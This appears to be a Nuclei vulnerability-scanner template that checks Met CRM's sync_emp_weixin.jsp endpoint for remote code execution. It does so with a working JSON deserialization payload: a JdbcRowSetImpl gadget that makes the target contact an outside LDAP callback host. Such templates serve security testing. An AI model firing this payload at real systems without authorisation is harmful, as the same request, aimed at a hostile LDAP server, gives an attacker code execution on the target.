id: met-crm-sync-emp-weixin-rce

info:
  name: Met CRM  sync_emp_weixin.jsp - Remote Code Execution
  author: qwtd
  severity: critical
  description: Checks for RCE vulnerability in Met CRM via crafted JSON payload.
  tags: 美特CRM

requests:
  - method: GET
    path:
      - "{{BaseURL}}/weixin/admin/sync_emp_weixin.jsp?emp_json=[{%22@type%22:%22[com.sun.rowset.JdbcRowSetImpl%22[{,%22dataSourceName%22:%22ldap://{{interactsh-url}}%22,%22autoCommit%22:true}]"

    headers:
      User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36
      Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
      Accept-Encoding: gzip, deflate, br
      Accept-Language: zh-CN,zh;q=0.9

    matchers-condition: and
    matchers:
      - type: word
        words:
          - "dns"
        part: interactsh_protocol # This checks if the DNS interaction contains expected data indicating exploitation success.
